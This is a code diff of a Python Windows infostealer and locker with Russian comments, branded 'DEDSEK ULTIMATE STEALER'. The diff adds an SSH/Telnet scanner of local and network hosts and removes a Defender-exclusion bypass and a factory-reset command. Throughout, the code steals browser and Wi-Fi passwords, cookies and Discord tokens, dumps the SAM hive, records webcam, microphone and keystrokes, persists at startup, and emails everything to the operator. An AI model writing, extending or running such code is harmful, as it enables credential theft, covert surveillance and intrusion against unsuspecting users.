@@ -43,10 +43,6 @@ def restore_win_key():
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
     except: pass
 
-def is_admin():
-    try: return ctypes.windll.shell32.IsUserAnAdmin()
-    except: return False
-
 # ===== EMAIL =====
 def send_email(msg, subj=None):
     try:
@@ -91,43 +87,51 @@ def add_to_startup():
             except: pass
     except: pass
 
-# ===== DEFENDER =====
-def bypass_defender():
+# ===== ВСЕ IP ДЛЯ SSH/TELNET =====
+def get_ssh_telnet_targets():
+    targets = []
+    
     try:
-        if is_admin():
-            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
-                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
+        public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+        targets.append(("EXTERNAL", public_ip, "Подключение из интернета"))
     except: pass
-
-# ===== ВСЕ IP АДРЕСА =====
-def get_all_ips():
-    ips = {}
-    try: ips['local'] = socket.gethostbyname(socket.gethostname())
-    except: ips['local'] = 'Unknown'
-    try: ips['public'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-    except: ips['public'] = 'Unknown'
+    
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+        targets.append(("LOCAL", local_ip, "Подключение из локальной сети"))
+    except: pass
+    
     try:
         route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         for line in route.split('\n'):
             if '.' in line and any(c.isdigit() for c in line):
                 gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
-                if gw: ips['gateway'] = gw[0]; break
-    except: ips['gateway'] = 'Unknown'
-    try:
-        dns = subprocess.check_output("ipconfig /all | findstr /i \"DNS\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        ips['dns'] = list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', dns)))[:5]
-    except: ips['dns'] = []
+                if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Роутер")); break
+    except: pass
+    
     try:
         arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        ips['arp_devices'] = list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))[:20]
-    except: ips['arp_devices'] = []
-    try:
-        netstat = subprocess.check_output("netstat -ano | findstr LISTENING", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        ips['open_ports'] = list(set(re.findall(r':(\d+)', netstat)))[:30]
-    except: ips['open_ports'] = []
-    return ips
+        arp_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', arp)
+        for ip in list(set(arp_ips))[:10]:
+            if ip not in [t[1] for t in targets] and not ip.endswith('.255') and not ip.endswith('.0'):
+                targets.append(("NETWORK", ip, "Устройство в сети"))
+    except: pass
+    
+    for i, (name, ip, desc) in enumerate(targets):
+        for port in [22, 23]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                result = s.connect_ex((ip, port))
+                if result == 0:
+                    service = "SSH" if port == 22 else "Telnet"
+                    targets[i] = (name, ip, f"{desc} | {service} ОТКРЫТ!")
+                s.close()
+            except: pass
+    
+    return targets
 
-# ===== РАСШИФРОВКА =====
+# ===== РАСШИФРОВКА ПАРОЛЕЙ =====
 def _decrypt_aes_gcm(data, key):
     try:
         from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -143,7 +147,7 @@ def _get_master_key(lp):
         except: pass
     return None
 
-def steal_chromium(browser, paths):
+def steal_chromium_passwords(browser, paths):
     res = []
     for lp in paths:
         if not os.path.exists(lp): continue
@@ -192,7 +196,7 @@ def _decrypt_3des(data, key, iv):
         return r[:-r[-1]] if r[-1] < 16 else r
     except: return None
 
-def steal_firefox():
+def steal_firefox_passwords():
     res = []
     base = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
     if not os.path.exists(base): return res
@@ -226,7 +230,7 @@ def steal_firefox():
         except: pass
     return res
 
-def steal_wifi():
+def steal_wifi_passwords():
     r = []
     try:
         for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
@@ -237,7 +241,7 @@ def steal_wifi():
                     key = "НЕТ"
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
-                    r.append(f"WiFi: {p}\nPASSWORD: {key}")
+                    r.append(f"WiFi: {p} | Пароль: {key}")
     except: pass
     return r
 
@@ -276,7 +280,7 @@ def steal_discord():
     return list(tokens)[:20]
 
 def dump_sam():
-    if not is_admin(): return "No admin"
+    if not ctypes.windll.shell32.IsUserAnAdmin(): return "No admin"
     try:
         sp = os.path.join(tempfile.gettempdir(), 'sam'); syp = os.path.join(tempfile.gettempdir(), 'system')
         os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
@@ -284,7 +288,7 @@ def dump_sam():
         if os.path.exists(sp) and os.path.getsize(sp) > 100:
             z = os.path.join(tempfile.gettempdir(), 'sam.zip')
             with zipfile.ZipFile(z, 'w') as zf: zf.write(sp, 'sam'); zf.write(syp, 'system')
-            send_file_email(z, "SAM+SYSTEM")
+            send_file_email(z, "[DedSek_Logs] SAM+SYSTEM")
             try: os.remove(z); os.remove(sp); os.remove(syp)
             except: pass
             return "SAM dumped!"
@@ -299,7 +303,7 @@ def capture_webcam():
             if ret:
                 fp = os.path.join(tempfile.gettempdir(), f'cam_{int(time.time())}.jpg')
                 cv2.imwrite(fp, frame)
-                send_file_email(fp, "Webcam")
+                send_file_email(fp, "[DedSek_Logs] Webcam")
                 try: os.remove(fp)
                 except: pass
         cam.release()
@@ -320,7 +324,7 @@ def record_mic():
         wf = wave.open(fp, 'wb')
         wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE)
         wf.writeframes(b''.join(frames)); wf.close()
-        send_file_email(fp, "Mic")
+        send_file_email(fp, "[DedSek_Logs] Mic")
         try: os.remove(fp)
         except: pass
     except: pass
@@ -393,87 +397,85 @@ def steal_clipboard():
 
 # ===== МЕГА-СТИЛЕР =====
 def mega_steal():
-    all_passwords = []
-    ips = get_all_ips()
+    targets = get_ssh_telnet_targets()
     
-    all_passwords.append("="*60)
-    all_passwords.append("DEDSEK ULTIMATE STEALER - LOGINS & PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.append(f"\nUSER: {os.environ.get('USERNAME')}")
-    all_passwords.append(f"PC: {socket.gethostname()}")
-    all_passwords.append(f"LOCAL IP: {ips.get('local', '?')}")
-    all_passwords.append(f"PUBLIC IP: {ips.get('public', '?')}")
-    all_passwords.append(f"GATEWAY: {ips.get('gateway', '?')}")
-    all_passwords.append(f"DNS: {', '.join(ips.get('dns', []))}")
-    all_passwords.append(f"OPEN PORTS: {', '.join(ips.get('open_ports', []))}")
-    all_passwords.append(f"ARP DEVICES: {', '.join(ips.get('arp_devices', []))}")
+    report = []
+    report.append("="*60)
+    report.append("DEDSEK ULTIMATE STEALER - SSH/TELNET TARGETS")
+    report.append("="*60)
+    report.append(f"\nUSER: {os.environ.get('USERNAME')}")
+    report.append(f"PC: {socket.gethostname()}")
+    
+    report.append("\n" + "="*60)
+    report.append("IP ДЛЯ ПОДКЛЮЧЕНИЯ (SSH/TELNET)")
+    report.append("="*60)
+    report.append(f"{'ТИП':<10} {'IP':<18} {'СТАТУС'}")
+    report.append("-"*60)
+    for name, ip, desc in targets:
+        report.append(f"{name:<10} {ip:<18} {desc}")
+    
+    report.append("\n" + "="*60)
+    report.append("КАК ИСПОЛЬЗОВАТЬ:")
+    report.append("="*60)
+    report.append("SSH:   ssh user@IP")
+    report.append("Telnet: telnet IP")
+    report.append("nmap:  nmap -p 22,23 IP")
     
     # Пароли браузеров
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("CHROME PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_chromium("CHROME", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')]) or ["No data"])
+    report.append("\n" + "="*60)
+    report.append("ПАРОЛИ БРАУЗЕРОВ")
+    report.append("="*60)
     
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("EDGE PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_chromium("EDGE", [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')]) or ["No data"])
+    browsers = {
+        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
+        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
+        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
+        "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
+    }
     
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("YANDEX PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_chromium("YANDEX", [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')]) or ["No data"])
+    for name, paths in browsers.items():
+        data = steal_chromium_passwords(name, paths)
+        if data:
+            report.append(f"\n--- {name} ---")
+            report.extend(data)
+        else:
+            report.append(f"\n--- {name} ---\nНет данных")
     
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("OPERA PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_chromium("OPERA", [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')]) or ["No data"])
+    report.append("\n--- FIREFOX ---")
+    ff_data = steal_firefox_passwords()
+    report.extend(ff_data if ff_data else ["Нет данных"])
     
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("FIREFOX PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_firefox() or ["No data"])
-    
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("WIFI PASSWORDS")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_wifi() or ["No data"])
+    # WiFi
+    report.append("\n" + "="*60)
+    report.append("WIFI ПАРОЛИ")
+    report.append("="*60)
+    wifi_data = steal_wifi_passwords()
+    report.extend(wifi_data if wifi_data else ["Нет данных"])
     
     # Куки
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("COOKIES")
-    all_passwords.append("="*60)
-    all_passwords.extend(steal_cookies_all())
+    report.append("\n" + "="*60)
+    report.append("COOKIES")
+    report.append("="*60)
+    report.extend(steal_cookies_all())
     
     # Discord
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("DISCORD TOKENS")
-    all_passwords.append("="*60)
+    report.append("\n" + "="*60)
+    report.append("DISCORD TOKENS")
+    report.append("="*60)
     tokens = steal_discord()
-    all_passwords.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
+    report.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["Нет токенов"])
     
     # SAM
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("WINDOWS PASSWORD (SAM)")
-    all_passwords.append("="*60)
-    all_passwords.append(dump_sam())
+    report.append("\n" + "="*60)
+    report.append("WINDOWS PASSWORD (SAM)")
+    report.append("="*60)
+    report.append(dump_sam())
     
-    # IP для сканирования
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append("IP ADDRESSES FOR PORT SCANNING")
-    all_passwords.append("="*60)
-    all_passwords.append(f"TARGET: {ips.get('gateway')} (Router)")
-    all_passwords.append(f"TARGET: {ips.get('public')} (External)")
-    all_passwords.append(f"TARGET: {ips.get('local')} (Local)")
-    for ip in ips.get('arp_devices', []):
-        all_passwords.append(f"TARGET: {ip} (Network Device)")
-    all_passwords.append(f"\nOPEN PORTS: {', '.join(ips.get('open_ports', []))}")
+    report.append("\n" + "="*60)
+    report.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
+    report.append("="*60)
     
-    all_passwords.append("\n" + "="*60)
-    all_passwords.append(f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}")
-    all_passwords.append("="*60)
-    
-    text = '\n'.join(all_passwords)
+    text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
         send_email(part, f"[DedSek_Logs] Full Report [{i+1}]")
     
@@ -558,8 +560,6 @@ def reset_windows():
         tk.Label(es, text="404 | ОШИБКА", bg='black', fg='#FF0000', font=('Courier',40,'bold')).pack(expand=True)
         tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier',20)).pack()
         es.update(); time.sleep(5); es.destroy()
-        os.system("taskkill /f /im explorer.exe >nul 2>&1")
-        os.system("systemreset -factoryreset"); time.sleep(3)
         os.system("shutdown /r /t 0 /f"); os._exit(0)
     except:
         os.system("shutdown /r /t 0 /f"); os._exit(0)
@@ -632,7 +632,7 @@ class WinLocker:
 
 # ===== MAIN =====
 if __name__ == "__main__":
-    hide_console(); disable_win_key(); bypass_defender(); add_to_startup()
+    hide_console(); disable_win_key(); add_to_startup()
     threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
